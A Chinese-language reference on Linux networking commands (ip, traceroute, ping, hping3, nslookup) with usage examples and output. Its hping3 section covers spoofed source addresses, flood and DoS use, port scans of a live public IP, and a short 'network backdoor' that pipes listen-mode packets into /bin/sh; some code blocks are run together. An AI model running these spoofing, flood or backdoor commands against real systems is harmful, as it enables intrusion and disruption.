# Linuxw网络命令合集

[toc]

## Overview

作为系统管理员或程序员，经常需要诊断分析和解决网络问题，而配置、监控与保护网络有助于发现问题并在事情范围扩大前得意解决，并且网络的性能与安全也是管理与诊断网络的重要部分。本文将总结常用与Linux网络管理的命令与使用示例，保持长期更新与更正。

## IP

`iproute2` 包含网络、路由、ARP缓存等的管理与配置的`ip`命令，用来取代传统的 `ifconfig` 与 `route`；`ip` 使用第二个参数，指定在对象执行的操作（例如，`add` `delete` `show`）。

ip 命令是配置网络接口的强大工具，任何 Linux 系统管理员都应该知道。它用于启动或关闭接口、分配和删除地址和路由、管理 ARP 缓存等等。

`ip` 常用的子命令有：

- `link` (`l`)  网络接口管理
- `address` (`a`)  IP地址管理
- `route` (`r`)  路由表管理
- `neigh` (`n`)  arp表管理

&gt; **各系统下的包名与安装**
&gt;
&gt; - Ubuntu/Debian: `iproute2`  ；`apt install iproute2`
&gt; - CentOS/Fedora: `iproute2` ；`yum install -y iproute2`
&gt; - Apline：`iproute2 ` ；`apk add iproute2`

### ip link

`ip link` 用于管理和显示网络接口

### 获取网络接口信息ip link show

查看特定设备信息

```bash
ip link show dev [device]
```

查看所有网络接口的统计信息（如传输或丢弃的数据包，错误等等）：

```bash
ip -s link
```

查看单个网络接口的类似信息：

```bash
ip -s link ls [interface]
```

例如

```
$ ip -s link ls eth0
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq state UP mode DEFAULT group default qlen 1000
    link/ether da:78:c8:7a:fb:26 brd ff:ff:ff:ff:ff:ff
    RX: bytes  packets  errors  dropped overrun mcast   
    38626072259 324723879 0       347316  0       0       
    TX: bytes  packets  errors  dropped carrier collsns 
    13404948080 6829250  0       0       0       0       
```

如果需要显示更多的详情，可以再添加一个 `-s`

```bash
ip -s -s link ls [interface]
```

仅查看启动（运行）的接口列表

```bash
ip link ls up
```

### 修改网络接口信息 ip link set

查看 `ip link` 的帮助

```bash
ip link help
```

启动/关闭网络接口

```bash
ip link set [interface] up/down
```

`ip link` 可以修改设备传输队列的长度

```bash
ip link set txqueuelen [number] dev [interface]
```

设置 **MTU** (Maximum Transmission Unit) 来提高网络性能

```bash
ip link set mtu [number] dev [interface]
```

###查看与管理IP地址 ip addr

显示所有设备

```bash
ip addr 
```

列出网络接口与IP地址

```bash
ip addr show
```

查看单个网络设备的信息

```bash
ip addr show dev [interface]
```

列出 IPv4/IPv6 地址

```bash
ip -4 addr
ip -6 addr
```

在Linux中添加网络地址

```bash
ip addr add [ip_address] dev [interface]
```

添加广播地址

```bash
ip addr add brd [ip_address] dev [interface]
```

删除接口上的网络地址

```bash
ip addr del [ip_address] dev [interface]
```

### 管理路由表 ip route

### 显示路由表 ip route list

```bash
ip route
ip route list
```

选择范围；上述命令列出内核内所有路由条目，如果想要缩小范围可以使用选择器 SELECTOR

语法：`ip route list SELECTOR`

**SELECTOR**:

- **root**：[ local | main | default | all | NUMBER ]

- **match**：

  [ match PREFIX ]

 ```bash
  ip route list match 10
 ```

- **exact**： [ exact PREFIX ]

- **TABLE** 

  [ table TABLE_ID ] [ local | main | default | all | NUMBER ]

 ```bash
  ip route list table local
  
  broadcast 127.0.0.0 dev lo proto kernel scope link src 127.0.0.1 
  local 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1 
  local 127.0.0.1 dev lo proto kernel scope host src 127.0.0.1 
  broadcast 127.255.255.255 dev lo proto kernel scope link src 127.0.0.1 
  broadcast 195.133.10.0 dev eth0 proto kernel scope link src 195.133.11.43 
  local 195.133.11.43 dev eth0 proto kernel scope host src 195.133.11.43 
  broadcast 195.133.11.255 dev eth0 proto kernel scope link src 195.133.11.43 
 ```

- **PROTO**

  [ proto RTPROTO ] [ kernel | boot | static | NUMBER ]

 ```
  ip route list proto static
 ```

- **TYPE** 

  [ type TYPE ] { unicast | local | broadcast | multicast | throw |unreachable | prohibit | blackhole | nat }

 ```
  ip route list type multicast
 ```

- **SCOPE**

  [ scope SCOPE ] [ host | link | global | NUMBER ]

 ```
  ip route list scope link
  
  169.254.0.0/16 dev eth0 metric 1002 
  172.16.0.0/20 dev eth0 proto kernel src 172.16.0.2 
 ```

### 修改路由表 ip route add/del

在指定设备上添加路由条目

```bash
ip route add [ip_address] dev [interface]
```

通过网关添加新路由

```bash
ip route add [ip_address] via [gatewayIP]
```

通过本地网关为**所有**地址添加默认路由

```bash
ip route add default [ip_address] dev [device]

ip route add default [network/mask] via [gatewayIP]
```

删除已经存在的路由表

```bash
ip route del [ip_address]
ip route del default
ip route del [ip_address] dev [interface]
```

### ARP地址表管理  ip neighbor

### 显示arp 条目 ip neigh show

显示系统中设备的MAC地址及其状态。设备存在的状态：

| 状态          | 说明                                                         |
| ------------- | ------------------------------------------------------------ |
| **REACHABLE** | 在超时过期之前有效且可访问的条目                             |
| **PERMANENT** | 管理员才能删除的永久条目                                     |
| **STALE**     | 有效但无法访问的条目；为了检查它的状态，内核在第一次传输时检查 |

例如

```bash
ip neigh show

192.168.10.1 dev eth0 lladdr 00:1f:ce:72:bd:8c REACHABLE
46.17.40.155 dev eth0 lladdr c4:71:fe:f1:9f:3f STALE
2a00:b700:3::1 dev eth0 lladdr 00:1f:ce:72:bd:8c router STALE
fe80::f0c5:a5ff:fee8:2aa4 dev eth0 lladdr f2:c5:a5:e8:2a:a4 router STALE
fe80::a48a:1eff:fe35:c2f7 dev eth0 lladdr a6:8a:1e:35:c2:f7 router STALE
fe80::4c4d:b3ff:fe44:fd58 dev eth0 lladdr 4e:4d:b3:44:fd:58 router STALE
fe80::4c33:dfff:fe92:9f2f dev eth0 lladdr 4e:33:df:92:9f:2f router STALE
fe80::21f:ceff:fe72:bd8c dev eth0 lladdr 00:1f:ce:72:bd:8c router STALE
```

### 修改arp条目 ip neigh add/del

```bash
ip neigh add [ip_address] dev [interface]

ip neigh del [ip_address] dev [interface]
```

## traceroute

`traceroute` 可以追踪数据传输是如何从本地传输到远程的。一个典型的例子是网页的访问。在互联网上加载一个网页需要数据流经一个网络和许多路由器。`traceroute` 可以显示所采用的路由以及网络上路由器的IP和主机名。它可以应用于排查网络延迟或诊断网络问题。

&gt; **各系统下的包名与安装**
&gt;
&gt; - Ubuntu/Debian: `traceroute`  ；`apt install traceroute -y`
&gt; - CentOS/Fedora: `traceroute` ；`yum install -y traceroute`
&gt; - Apline：`busybox ` ；`apk add busybox`

### 追踪网络主机的路由 traceroute host

```bash
traceroute baidu.com

traceroute to baidu.com (220.181.38.148), 30 hops max, 60 byte packets
 1  * 9.31.61.129 (9.31.61.129)  1.795 ms *
 2  9.31.123.98 (9.31.123.98)  0.907 ms  1.179 ms  1.416 ms
 3  10.196.18.109 (10.196.18.109)  0.866 ms 10.196.18.125 (10.196.18.125)  1.085 ms *
 4  10.162.33.5 (10.162.33.5)  1.297 ms 10.200.16.169 (10.200.16.169)  0.774 ms 10.196.92.109 (10.196.92.109)  1.218 ms
 5  10.162.32.145 (10.162.32.145)  1.539 ms  1.431 ms 10.162.32.149 (10.162.32.149)  1.310 ms
 6  * * *
 7  58.63.249.45 (58.63.249.45)  7.320 ms * 121.14.50.25 (121.14.50.25)  7.859 ms
 8  * * 113.96.4.121 (113.96.4.121)  4.887 ms
 9  202.97.22.149 (202.97.22.149)  32.481 ms 202.97.22.153 (202.97.22.153)  32.676 ms
10  36.110.245.206 (36.110.245.206)  36.928 ms 36.110.247.54 (36.110.247.54)  37.593 ms 36.110.245.82 (36.110.245.82)  41.254 ms
11  36.110.245.161 (36.110.245.161)  33.749 ms *  37.905 ms
12  * * *
13  * * 220.181.182.170 (220.181.182.170)  42.998 ms
14  * * *
15  * * *
16  * * *
17  * * *
18  * * *
19  * * *
20  * * *
21  * * *
22  * * *
23  * * *
24  * * *
25  * * *
26  * * *
27  * * *
28  * * *
29  * * *
30  * * *
```

第一行显示要访问的主机名和ip、traceroute将尝试到主机的最大跃点数以及要发送的字节数据包的大小。

每行列出到达目的地的一个跳跃点。给出主机名与主机名的ip，然后是数据包到达主机并返回发起计算机所需的时间。默认情况下，`traceroute` 为每个主机发送三个数据包，因此列出了三个响应时间。

星号 `*` 表示丢失的数据包。这意味着网络中断、大量流量导致网络拥塞或防火墙丢弃流量。

### 追踪IPv6协议

```bash
traceroute -6 ipv6.google.com
```

### 忽略主机名与IP的映射

使用-n选项在traceroute中禁用IP地址映射。

```bash
traceroute -n qq.com

traceroute to qq.com (183.3.226.35), 30 hops max, 60 byte packets
 1  9.31.61.129  0.908 ms  1.159 ms  1.537 ms
 2  9.31.122.210  1.061 ms  0.837 ms  1.421 ms
```

### 设置相应等待时间

使用 `-w ` 选项在`traceroute` 中配置响应等待时间，支持指定等待对探测的响应的时间（秒为单位）。

```bash
traceroute -w 1 -n qq.com
```

### 使用特定的网络接口

使用-i选项设置traceroute应使用的网络接口，如果未设置，则根据路由表选择接口。

```bash
traceroute -w 1 -n -i eth0 qq.com
```


## ping

Ping是一种简单、广泛使用的跨平台网络工具，用于测试主机是否可以在Internet协议（IP）网络上访问。它的工作原理是向目标主机发送网络控制消息协议**Internet Control Message Protocol** (**ICMP**) **ECHO_REQUEST**，目标节点等待并回复 **ECHO_RESPONSE**。

可以使用`ping` 测试两节点间的网络通信，可以做到：

- 目标主机是否可用，
- 测量数据包到达目标主机并返回计算机所需的时间（与目标主机通信的往返时间（rtt）），以及数据包丢失的百分比。

&gt; **各系统下的安装**
&gt;
&gt; - Ubuntu/Debian: `iputils-ping`  ；`apt install iputils-ping`
&gt; - CentOS/Fedora: `iputils` ；`yum install -y iputils`
&gt; - Apline：`iputils ` ；`apk add iputils`

使用参数

| 参数 | 说明                                                         |
| :--: | ------------------------------------------------------------ |
|  -c  | 指定发送**ECHO_REQUEST**的请求数                             |
|  -i  | 设置包与包之间的间隔 `ping -i 3 -c 5 www.google.com`         |
|  -f  | flood ping，检测高负载下的响应，需要有root权限               |
|  -b  | 允许ping一个广播地址                                         |
|  -t  | 限制ping遍历的网络跳跃数（TTL **Time-to-live**），收到数据包的每个路由器从计数中至少减去 1，如果大于 0，路由器会将数据包转发到下一跳，否则它会丢弃它并将 ICMP 响应返回。 |
|  -s  | 设置ping时的数据包大小（单位 bytes），这将导致提供的总数据包大小加上ICMP头的8个额外字节。 |
|  -l  | 发送预加载数据包（先发不等待回复的数据包），大于3需要root权限 |
|  -W  | 设置等待相应时间，单位秒                                     |
|  -w  | 设置超时时间，超时退出，单位秒                               |
|  -d  | debug模式                                                    |
|  -v  | 显示详细输出                                                 |
|  -A  | 更快的在两节点间包往返的时间，非特权用户最小为200ms          |

## hping

hping一个具有可嵌入tcl脚本功能的 `TCP/IP`包伪造工具。，主要用于创建或生成网络数据包以测试网络、服务或系统性能。 hping 是由不同实体开发的旧工具，并以 `hping2` 或 `hping3` 等新版本命名。 在大多数情况下，您可以使用操作系统提供的命令，可以是 hping 或 hping2 或 hping3。 hping 名称源自 ping 命令名称。`hping3` 是另一种用于扫描网络的工具。它在kali linux中默认是DOS攻击软件之一。

hping支持TCP、UDP、ICMP、raw-IP等协议用于不同的用例。通过使用hping，可以创建具有不同选项的不同协议包。hping主要可以用作。

- 创建原始IP数据包
- 生成指定数量的数据包
- 设置包发送间隔
- 指定传输网络接口
- 创建和生成TCP数据包
- 创建和生成UDP数据包
- 创建和生成IP数据包
- 创建和生成ICMP数据包
- 设置MTU值
- 设置碎片并创建碎片或未碎片的数据包
- 设置数据包的有效负载或数据大小

hping的常用场景

- 模拟DOS和DDOS攻击
- 测试防火墙和TCP、UDP、IP等协议的防火墙配置
- TCP和UDP端口扫描
- 测试网络设备的配置，如碎片、MTU等。
- 用于列出中间主机的高级跟踪路由
- 远程操作系统指纹识别和检测
- 远程正常运行时间决策
- TCP/IP协议实现与栈测试审计

&gt;**各系统下的安装**
&gt;
&gt;- Ubuntu/Debian: `hping3`  ；`apt install hping3`
&gt;- CentOS/Fedora: `hping3` ；`yum install epel-release &amp;&amp; yum install -y hping3`
&gt;- Apline：`hping3 ` ；`apk add hping3 --update-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing`

### 参数说明

**基础参数**

| 参数选项                          | 参数说明                                                     |
| :-------------------------------- | :----------------------------------------------------------- |
| `-c --count [count]`              | 发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑 |
| `-i --interval  `                 | 每个包发送间隔时间(单位是毫秒) 缺省时间是1秒,此功能在增加传输率上很重要。&lt;br&gt; `-i 1  `  为1s  &lt;br&gt;`-i u1` 为1us （微秒） 即每秒发送1000000包 |
| `--fast`                          | 为 ` -i u10000` 的别名，即1秒发送10个包                      |
| `--faster`                        | 为 `-i u1` 的别名，但实际上发送的包取决于计算机的速度        |
| ` --flood`                        | 尽可能快速的发送包，不关注收到的恢复，要比 `-i u0` 快        |
| `-I --interface [interface name]` | 指定默认的路由接口，在linux中，hping3使用默认路由接口。&lt;br/&gt;可以使用 `-I` 接网络接口的完整名称，如 `eth0` |
| `-q -quiet `                      | 安静输出。除了启动时和完成时的摘要信息外，不输出任何内容。   |
| `-n -nmeric`                      | 数字化输出主机地址                                           |

**协议选项**

默认情况下，hping使用的为tcp协议

| 选项                     | 说明                                                         |
| ------------------------ | ------------------------------------------------------------ |
| `-0 --rawip`             | 原始IP模式，此模式下，hping3将发送IP头。                     |
| `-1 --icmp`              | ICMP模式，默认情况下hping3将发送ICMP回显请求。               |
| `-2 --udp`               | UDP模式，默认情况下，hping3将向目标主机的0端口发送UDP        |
| `-8 --scan`              | 端口扫描，在该模式下，需要提供一组端口，如 ` 1,2,3 ` 端口组以 `,` 分隔&lt;br&gt;端口范围：`start-end`  如 `1000-2000` &lt;br&gt;特殊字符：`all` 表示所有端口；`know` ：包含 `/etc/services` 中的所有端口&lt;br&gt;组合写法：`hping --scan 1-1000,8888,known -S www.baidu.com` |
| ` -9 --listen signature` | 监听模式，此模式下 `hping3`  等待包含签名的数据包并从签名端转储到数据包的结尾处。 |

**IP相关选项**

| 参数                  | 说明                                                         |
| --------------------- | ------------------------------------------------------------ |
| `-a --spoof hostname` | 此选项可以伪造源IP地址，可确保目标不会获得真实IP地址，必然性的响应将被发送到伪造的地址处。 |
| `--rand-source`       | 此选项开启随机源模式。hping将发送带有随机源地址的数据包。    |
| `--rand-dest`         | 此选项开启随机目标模式。hping将数据包发送到随机目标地址&lt;br/&gt;如，当使用随机目标地址时，可以使用`x` 作为范围，所有出现的 `x` 都将呗替换为0-255之间的随机数。如`10.0.0.x`。可以使用`--debug` 选项查看生成的随机地址。&lt;br/&gt;注意：使用此选项，hping无法检测数据包的正确传出接口，应使用 `-I `选项指定网络接口。 |
| `-t --ttl`            | 此选项可以设置传出数据包的TTL（生存时间）                    |
| `-N id`               | 设置IP字段的随机值                                           |
| `-H --ipproto`        | 在RAW IP模式中设置IP协议                                     |
| ` -r --rel`           | ip id等增量                                                  |
| `-m –mtu`             | 设置虚拟最大传输单元                                         |

**icmp选项**

| 参数                 | 说明                                              |
| -------------------- | ------------------------------------------------- |
| `-C --icmptype type` | 设置icmp类型，默认为icmp echo reques。            |
| `--icmp-ipver`       | 设设置包含在ICMP数据中的IP头的IP版本，默认值为4。 |
| `--icmp-ipproto`     | 设置包含在ICMP数据中的IP头的IP协议，默认为TCP。   |

**TCP/UDP选项**

| 参数                        | 说明                                                         |
| --------------------------- | ------------------------------------------------------------ |
| `-s --baseport [src port]`  | 随机源端口                                                   |
| `-p --destport [dest port]` | 设置目标端口&lt;br&gt;`&#43;` 目标端口将随着收到的每个回复而增加&lt;br&gt;`&#43;&#43;` 目标端口每发送数据包都会增加 |
| --keep                      | 保持源端口不边                                               |
| -w --win                    | 设置tcp窗口大小，默认64                                      |
| -F --fin                    | 设置 tcp fin标记                                             |
| -S --syn                    | 设置 tcp SYN标记                                             |
| -R --rst                    | 设置 tcp rst标记                                             |
| -P --push                   | 设置 tcp PUSH标记                                            |
| -A --ack                    | 设置 tcp ACK标记                                             |
| -U --urg                    | 设置 tcp URG标记                                             |
| -X --xmas                   | 设置 tcp Xmas标记                                            |
| -Y --ymas                   | 设置 tcp Ymas标记                                            |

**常用参数**

| 参数                   | 说明                                                         |
| ---------------------- | ------------------------------------------------------------ |
| `-d --data`            | 设置数据包主体大小。 `使用 --data 40` hping将在 protocol_header 增加40 字节。 |
| `-E --file [filename]` | 使用文件名内容填充数据包的数据                               |
| ` -j --dump`           | 以16进制导出数据包                                           |
| `-J --print`           | 导出可打印的数据包                                           |
| `-u --end`             | 如果使用 ``--file filename` 选项，何时为EOF。                |
| `-T --traceroute`      | traceroute 模式。此选项将在接收ttl来尝试追踪。               |
| `--tr-keep-ttl`        | 保持ttl的固定，用于监视某一跳                                |
| `–tr-stop`             | traceroute 下收到第一个不是ICMP时退出                        |
| ....                   |                                                              |

**输出格式**

hping的一个标准的TCP/UDP格式如下，UDP字段含义与TCP的相同。

```bash
# tcp
len=46 ip=192.168.1.1 flags=RA DF seq=0 ttl=255 id=0 win=0 rtt=0.4 ms

# udp
len=46 ip=192.168.1.1 seq=0 ttl=64 id=0 rtt=6.0 ms
```

- len：len是从数据链路层捕获的数据的大小（字节），不包括数据链路头大小。
- ip：  ip 为请求的ip
- flags：flags为TCP的标记，如
  - R  RESET
  - S SYN
  - A  ACK
  - F FIN
  - P PUSH
  - U URGENT
  - X 不标准的 0x40
  - Y 不标准的 0x80
- seq：seq是数据包的序列号，使用TCP/UDP数据包的源端口获得
- id  是IP ID字段。
- win  TCP 窗口大小
- rtt   往返时间 （round trip time），单位毫秒
- 以下是使用-V参数后的字段
  - tos 是IP标头的服务类型字段。
  - iplen ip的总长度
  - seq 和 ack 是TCP标头中的序列号和32位确认号
  - 是TCP标头校验和值。
  - urp TCP紧急指针值。

**ICMP的输出格式**

```bash
ICMP Port Unreachable from ip=192.168.1.1 name=nano.marmoc.net
```

在此格式中，ip 为 ICMP 错误的 IP 地址，name为解析的名称或者为UNKNOWN，而其他的参数含义与TCP/UDP大致相同。

### 端口扫描

hping可以自由地创建原始IP、TCP、UDP和ICMP数据包。可以利用此功能生成 `TCP SYN` 扫描。`TCP-SYN` 扫描是最简单的将数据包发送到主机/IP端口的方法。这里 扫描的为`110.242.68.4:80` 



启动经典的扫描的最简单方法是将TCP-SYN数据包发送到主机/ip上的端口。下面的命令将扫描IP 192.168.8.223上的端口80。从输出中，可以看到 `flags=SA` SYN和ACK标记，代表一个开放端口。

```bash
hping3 -S 110.242.68.4 -p 80 -c 2
```

扫描一个范围的端口可以使用 `&#43;&#43;`

```bash
hping3 -S 110.242.68.4 -p &#43;&#43;80
```

也可以使用如下方式

```bash
hping3 -8 80-86 -S 110.242.68.4 

Scanning 110.242.68.4 (110.242.68.4), port 80-86
7 ports to scan, use -V to see all the replies
&#43;----&#43;-----------&#43;---------&#43;---&#43;-----&#43;-----&#43;-----&#43;
|port| serv name |  flags  |ttl| id  | win | len |
&#43;----&#43;-----------&#43;---------&#43;---&#43;-----&#43;-----&#43;-----&#43;
   80 http       : .S..A... 128 60936 64240    46
All replies received. Done.
Not responding ports: (81 ) (82 xfer) (83 mit-ml-dev) (84 ctf) (85 ) (86 mfcobol) 
```

### 通过Hping3跟踪路由到指定端口：

hping3支持一个很实用功能，可以追踪路由到一个指出的端口，查看你的数据包被阻塞的地方。

```bash
hping3 --traceroute -p 80 -V -1 www.google.com

using eth0, addr: 195.133.11.43, MTU: 1500
HPING www.google.com (eth0 142.250.150.104): icmp mode set, 28 headers &#43; 0 data bytes
hop=1 TTL 0 during transit from ip=195.133.10.1 name=gateway   
hop=1 hoprtt=3.1 ms
hop=2 TTL 0 during transit from ip=10.11.12.37 name=UNKNOWN   
hop=2 hoprtt=10.0 ms
hop=3 TTL 0 during transit from ip=62.140.243.62 name=msk-m9-b1-ae30-vlan449.fiord.net
hop=3 hoprtt=1.9 ms
hop=4 TTL 0 during transit from ip=62.140.239.113 name=msk-m9-b6-ae1-vlan12.fiord.net
hop=4 hoprtt=9.8 ms
hop=5 TTL 0 during transit from ip=72.14.222.198 name=UNKNOWN   
hop=5 hoprtt=4.2 ms
hop=6 TTL 0 during transit from ip=108.170.250.33 name=UNKNOWN   
hop=6 hoprtt=3.8 ms
hop=7 TTL 0 during transit from ip=108.170.250.51 name=UNKNOWN   
hop=7 hoprtt=2.5 ms
hop=8 TTL 0 during transit from ip=142.251.49.158 name=UNKNOWN   
hop=8 hoprtt=34.7 ms
hop=9 TTL 0 during transit from ip=108.170.235.204 name=UNKNOWN   
hop=9 hoprtt=18.2 ms
hop=10 TTL 0 during transit from ip=142.250.209.35 name=UNKNOWN   
hop=10 hoprtt=17.1 ms
....
```

### 不同类型的ICMP

```bash
hping3 -c 5 -V -1 -C 17 110.242.68.4 

using eth0, addr: 10.0.0.4, MTU: 1500
HPING 110.242.68.4 (eth0 110.242.68.4): icmp mode set, 28 headers &#43; 0 data bytes

--- 110.242.68.4 hping statistic ---
5 packets transmitted, 0 packets received, 100% packet loss
round-trip min/avg/max = 0.0/0.0/0.0 ms
```

通过hping3进行TCP FIN扫描

在TCP连接中，FIN标志用于开始请求关闭连接。万一没有得到答复，那说明端口是开放的。通常防火墙会再次发送Rst&#43;ack数据包，以指示该端口已关闭。



### 通过hping3 进行ACK扫描

有些情况下，主机可能禁止PING ICMP，此时使用ACK扫描可以用于检查主机是否处于活动状态。如果主机活跃，会相应RST标记，在hping中是为 `flags=R`。

```bash
hping3 -c 2 -V -p 80 -A 110.242.68.4 

using eth0, addr: 10.0.0.4, MTU: 1500
HPING 110.242.68.4 (eth0 110.242.68.4): A set, 40 headers &#43; 0 data bytes
len=46 ip=110.242.68.4 ttl=128 id=2391 tos=0 iplen=40
sport=80 flags=R seq=0 win=32767 rtt=0.6 ms
seq=1165126080 ack=0 sum=c0ba urp=0
```

### UDP扫描

使用参数 `-2` 可以让hping工作于UDP模式，可以进行UDP扫描

```bash
hping3 -2 8.8.4.4 -V -p 53 -c 10
```

### 操作系统识别

使用-Q或-seqnum可以让`hping` 收集了ISN。

```bash
hping3 127.0.0.1 -Q -p 22 -V -S

using lo, addr: 127.0.0.1, MTU: 65536
HPING 127.0.0.1 (lo 127.0.0.1): S set, 40 headers &#43; 0 data bytes
 893247485 &#43;893247485
2568100167 &#43;1674852682
2600543427 &#43;32443260
```

### 内容探测

可以使用hping的监听模式，来抓取通过网络接口的所有流量，以及捕获对应的内容。例如抓取通过谷歌搜索的流量包

```bash
hping3 -9 &#34;www.google.com&#34; --beep -I eth0hping2 listen mode[main] memlockall(): SuccessWarning: can&#39;t disable memory paging!Accept: */*.hk/url?sa=p&amp;hl=zh-CN&amp;pref=hkredirect&amp;pval=yes&amp;q=http://www.google.com.hk/&amp;ust=1624605433464983&amp;usg=AOvVaw2THxd5w15lxgX3_KA19GWLCache-Control: privateContent-Type: text/html; charset=UTF-8P3P: CP=&#34;This is not a P3P policy! See g.co/p3phelp for more info.&#34;Date: Fri, 25 Jun 2021 07:16:43 GMTServer: gwsContent-Length: 370X-XSS-Protection: 0X-Frame-Options: SAMEORIGINSet-Cookie: 1P_JAR=2021-06-25-07; expires=Sun, 25-Jul-2021 07:16:43 GMT; path=/; domain=.google.com; SecureSet-Cookie: NID=217=PdQLBtU-tTavgvb4BW9ouB3nAr1OKNK6I_kn9u2Qa2eTgLA_qLyGv2G_2t2G_PRNVrKu2SOEm-e7ED17ljnx3uFBweBjQWOyRvHrJ6jhC5_J3yaBK0r8mikUrqHNjDez5F3rCleFQDurBEfnqECDFXNkvvO_-Wn4ahGJeid01TM; expires=Sat, 25-Dec-2021 07:16:43 GMT; path=/; domain=.google.com; HttpOnly&lt;HTML&gt;&lt;HEAD&gt;&lt;meta http-equiv=&#34;content-type&#34; content=&#34;text/html;charset=utf-8&#34;&gt;&lt;TITLE&gt;302 Moved&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;302 Moved&lt;/H1&gt;The document has moved&lt;A HREF=&#34;http://www.google.com.hk/url?sa=p&amp;amp;hl=zh-CN&amp;amp;pref=hkredirect&amp;amp;pval=yes&amp;amp;q=http://www.google.com.hk/&amp;amp;ust=1624605433464983&amp;amp;usg=AOvVaw2THxd5w15lxgX3_KA19GWL&#34;&gt;here&lt;/A&gt;.&lt;/BODY&gt;&lt;/HTML&gt;.hk/&amp;ust=1624605433464983&amp;usg=AOvVaw2THxd5w15lxgX3_KA19GWL HTTP/1.1User-Agent: curl/7.29.0Host: www.google.com.hkAccept: */*.hk/Cache-Control: privateContent-Type: text/html; charset=UTF-8P3P: CP=&#34;This is not a P3P policy! See g.co/p3phelp for more info.&#34;Date: Fri, 25 Jun 2021 07:16:43 GMTServer: gwsContent-Length: 222X-XSS-Protection: 0Set-Cookie: 1P_JAR=2021-06-25-07; e
```

### 网络后门

可以通过hping3的监听模式，创建一个简单的后门(backdoor)，通过管道来执行脚本

```bash
hping3 -I eth1 -9 secret | /bin/shhping3 -R 192.168.1.100 -e secret -E commands_file -d 100 -c 1
```



## nslookup

***nslookup***（name server lookup）用于在Linux中执行DNS查找的工具。用于显示DNS详细信息，例如计算机的IP地址、域的MX记录或域的NS服务器。

nslookup 可以在两种模式下运行：交互式和非交互式。交互模式可以查询名称服务器以获取有关各种主机和域的信息或打印域中的主机列表。非交互模式仅打印主机或域的名称和请求的信息。

&gt;**各系统下的安装**
&gt;
&gt;- Ubuntu/Debian:  `knot-dnsutils`  ；`apt install knot-dnsutils`
&gt;- CentOS/Fedora: `bind-utils` | `dnsutils` ；`yum install -y bind-utils`
&gt;- Apline：`bind-tools ` ；`apk add bind-tools`


### 简单查询

nslookup后跟域名将显示域名的“A记录”（IP地址）,nslookup命令的默认输出比dig命令的默认输出相对整洁些。

```bash
nslookup redhat.com
```

执行反向DNS查找：

```bash
nslookup 208.117.229.88
```

### 查询MX记录

MX（ Mail Exchange ）记录将域名映射到该域的邮件服务器列表。MX记录表明发到 `@qq.com` 的所有邮件都应该路由到该域中的邮件服务器。

```bash
nslookup -query=mx qq.com

Server:         183.60.83.19
Address:        183.60.83.19#53

Non-authoritative answer:
qq.com  mail exchanger = 20 mx2.qq.com.
qq.com  mail exchanger = 30 mx1.qq.com.
qq.com  mail exchanger = 10 mx3.qq.com.

Authoritative answers can be found from:
```

Authoritative Answer与Non-Authoritative Answer

可以注意到注意到上面输出中的关键字 `Authoritative` 和 `Non-Authoritative Answer`。任何来自DNS服务器的答复都称为`Authoritative Answer`，该服务器具有域可用的完整区域文件信息。在许多情况下，DNS服务器将不具备给定域的完整区域文件信息。相反，它维护一个缓存文件，该文件包含过去执行的所有查询的结果，并已获得权威响应。当给出一个DNS查询时，它搜索缓存文件，并以 `Non-Authoritative Answer` 的形式返回可用的信息。

### 查询NS记录

NS ( Name Server ) 记录将域名映射到该域的授权DNS服务器列表。它将输出与给定域关联的名称服务。

```bash
nslookup -type=ns qq.comServer:         183.60.83.19Address:        183.60.83.19#53Non-authoritative answer:qq.com  nameserver = ns1.qq.com.qq.com  nameserver = ns2.qq.com.qq.com  nameserver = ns3.qq.com.qq.com  nameserver = ns4.qq.com.Authoritative answers can be found from:
```

### 查询SOA记录

SOA ( start of authority )记录\，提供关于域的权威信息、域管理员的电子邮件地址、域序列号等。

```bash
nslookup -type=soa qq.com

Server:         183.60.83.19
Address:        183.60.83.19#53

Non-authoritative answer:
qq.com
        origin = ns1.qq.com
        mail addr = webmaster.qq.com
        serial = 1330914143
        refresh = 3600
        retry = 300
        expire = 86400
        minimum = 300

Authoritative answers can be found from:
```

- mail addr–指定域管理员的邮件地址
- serial 一种版本编号系统。标准惯例是使用 `YYYYMMYNN` 格式 `2012-07-16.01`如果在同一天进行了多个编辑，则将递增） 
- refresh 指定从DNS服务何时轮询主DNS以查看序列号是否已增加（以秒为单位）。如果增加，从DNS服务器将发出复制新区域文件的新请求。
- retry 指定与主DNS重新连接的间隔
- expire 指定辅助DNS保持缓存区域文件有效的时间
- minimum 指定从DNS应缓存区域文件的时间

### 查看可用的DNS记录

```bash
nslookup -type=any qq.com

Server:         183.60.83.19
Address:        183.60.83.19#53

Non-authoritative answer:
Name:   qq.com
Address: 61.129.7.47
Name:   qq.com
Address: 183.3.226.35
Name:   qq.com
Address: 203.205.254.157
Name:   qq.com
Address: 123.151.137.18
qq.com  mail exchanger = 10 mx3.qq.com.
qq.com  mail exchanger = 20 mx2.qq.com.
qq.com  mail exchanger = 30 mx1.qq.com.

Authoritative answers can be found from:
```

### 使用指定DNS查询

可以指定特定的DNS来解析域名，而不是使用默认DNS进行查询。

```bash
nslookup www.qq.com 8.8.8.8

Server:         8.8.8.8
Address:        8.8.8.8#53

Non-authoritative answer:
www.qq.com      canonical name = news.qq.com.edgekey.net.
news.qq.com.edgekey.net canonical name = e6156.dscf.akamaiedge.net.
Name:   e6156.dscf.akamaiedge.net
Address: 23.219.132.75
Name:   e6156.dscf.akamaiedge.net
Address: 2600:1417:76:494::180c
Name:   e6156.dscf.akamaiedge.net
Address: 2600:1417:76:480::180c
```

### 使用特殊的dns端口

默认情况下，DNS使用端口号为53。可以使用-port选项指定端口号。

```bash
nslookup -port 56 qq.com
```

### 设置超时时间

可以使用 `-timeout` 选项来指定超时时间

```bash
nslookup -timeout=10 qq.com
```

### 启用调试模式

`-debug` 选项打开/关闭调试

```bash
nslookup -debug qq.com

Server:         183.60.83.19
Address:        183.60.83.19#53

------------
    QUESTIONS:
        qq.com, type = A, class = IN
    ANSWERS:
    -&gt;  qq.com
        internet address = 183.3.226.35
        ttl = 92
    -&gt;  qq.com
        internet address = 203.205.254.157
        ttl = 92
    -&gt;  qq.com
        internet address = 61.129.7.47
        ttl = 92
    -&gt;  qq.com
        internet address = 123.151.137.18
        ttl = 92
    AUTHORITY RECORDS:
    ADDITIONAL RECORDS:
------------
